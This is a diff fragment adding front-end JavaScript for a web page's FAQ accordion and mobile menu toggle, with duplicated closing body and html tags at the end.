+  document.querySelectorAll('.faq-question').forEach(button => {
+    button.addEventListener('click', () => {
+      const faqItem = button.parentElement;
+      faqItem.classList.toggle('active');
+    });
+  });
+
+  const menuBtn = document.getElementById('menu-btn');
+  const menu = document.getElementById('menu');
+  const overlay = document.getElementById('overlay');
+
+  function toggleMenu() {
+    menu.classList.toggle('open');
+    overlay.classList.toggle('show');
+  }
+
+  menuBtn.addEventListener('click', toggleMenu);
+  overlay.addEventListener('click', toggleMenu);
+
+  document.querySelectorAll('#menu a').forEach(link => {
+    link.addEventListener('click', toggleMenu);
+  });
+</script>
+</body>
+
+</body>
+</html>
+</html>
+
